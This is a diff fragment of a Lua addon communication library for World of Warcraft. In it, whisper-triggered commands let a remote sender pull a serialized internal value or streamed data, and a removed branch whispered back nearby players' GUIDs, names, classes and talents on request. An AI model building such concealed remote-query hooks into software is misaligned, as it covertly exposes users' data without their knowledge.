+							local _, msg = pcall(GetSerializerd, param, 2);
+							if msg ~= nil then
+								SendTrunk(
+									STREAMER_PREFIX,
+									STREAMER_MSG_V_REPLY .. "`" .. param[2] .. "`",
+									255 - 6 - 1 - #param[2] - 1,
+									msg, "WHISPER", sender
+								);
+							end
+						elseif __ala_meta__.__DEVHASH[PFNAME] then
+							if __ala_meta__.__SYNC then
+								--	Dialog("[" .. name .. "] is trying to pull" .. "[" .. msg .. "]", { name, msg, param[1], rep, param[3], });
+							end
+						elseif param[1] == 'SINGLE' or param[1] == 'S' then
+							param[2] = 1;
+							_SendFunc(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender, true);
 							S.__top = S.__top + 1;
 							if S.__top > 1024 then
 								S.__top = 1;
 							end
-						elseif __ala_meta__.__DEVHASH[PFNAME] then
-							if __ala_meta__.__SYNC then
-								--	Dialog("[" .. name .. "] is trying to pull" .. "[" .. msg .. "]", { name, msg, c, rep, ext, });
-							end
-						elseif c == 'm' then
-							rep = tonumber(rep) or 1;
-							for index = 1, rep do
-								SendAddonMessage(ADDON_PREFIX, ADDON_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender);
+						elseif param[1] == 'MULTI' or param[1] == 'M' then
+							param[2] = tonumber(param[2]) or 1;
+							for index = 1, param[2] do
+								_SendFunc(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", __commlib.CPlayerName, true);
 								S.__top = S.__top + 1;
 								if S.__top > 1024 then
 									S.__top = 1;
 								end
 							end
-						elseif c == 'k' then
-							local function try()
-								for _, unit in next, { 'target', 'mouseover', 'focus', 'party1', 'nameplate1', } do
-									if UnitExists(unit) and UnitIsPlayer(unit) and not UnitIsEnemy('player', unit) then
-										SendAddonMessage(ADDON_PREFIX, ADDON_MSG_STREAMER .. unit .. "#" .. UnitGUID(unit) .. "#" .. UnitName(unit) .. "#" .. UnitClassBase(unit) .. "#" .. UnitTalents(unit), "WHISPER", sender);
-										return false;
-									end
-								end
-								return true;
-							end
-							local f;
-							function f()
-								if try() then
-									C_Timer_After(1.0, f);
-								end
-							end
-							C_Timer_After(0.0, f);
 						end
-					elseif control_code == ADDON_MSG_REPLY then
-						if __ala_meta__.__onstream ~= nil then
-							__ala_meta__.__onstream(strsub(msg, ADDON_MSG_CONTROL_CODE_LEN + 1));
+					elseif control_code == STREAMER_MSG_S_REPLY then
+						if __ala_meta__.__onstream[control_code] ~= nil then
+							__ala_meta__.__onstream[control_code](sender, strsub(msg, STREAMER_CONTROL_CODE_LEN + 2));
 						end
+					elseif control_code == STREAMER_MSG_G_REPLY then
+						if __ala_meta__.__onstream[control_code] ~= nil then
+							__ala_meta__.__onstream[control_code](sender, strsub(msg, STREAMER_CONTROL_CODE_LEN + 2));
+						end
+					elseif control_code == STREAMER_MSG_V_REPLY then
+						if __ala_meta__.__onstream[control_code] ~= nil then
+							__ala_meta__.__onstream[control_code](sender, strsub(msg, STREAMER_CONTROL_CODE_LEN + 2));
+						end
+					elseif control_code == STREAMER_MSG_STREAMER then
 					end
 				end
 			end
 		end
 		function E.LOADING_SCREEN_DISABLED(F, event, ...)
 			F:UnregisterEvent("LOADING_SCREEN_DISABLED");
-			RegisterAddonMessagePrefix(ADDON_PREFIX);
+			RegisterAddonMessagePrefix(STREAMER_PREFIX);
 			E.LOADING_SCREEN_DISABLED = nil;
 			--
 			EnterCombatTime = InCombatLockdown() and GetTime() or nil;
@@ -514,4 +719,12 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 	__ala_meta__.__SYNC.REALTIME = nil;
 	__ala_meta__.__SYNC.ONLOGIN = nil;
 	__ala_meta__.__SYNC.ONLOGOUT = nil;
+
 -->
+
+function __commlib:Halt()
+	__commlib:UnregisterAllEvents();
+	__commlib:SetScript("OnEvent", nil);
+	_SendBufferPos = 1;
+	_SendBufferTop = 0;
+end
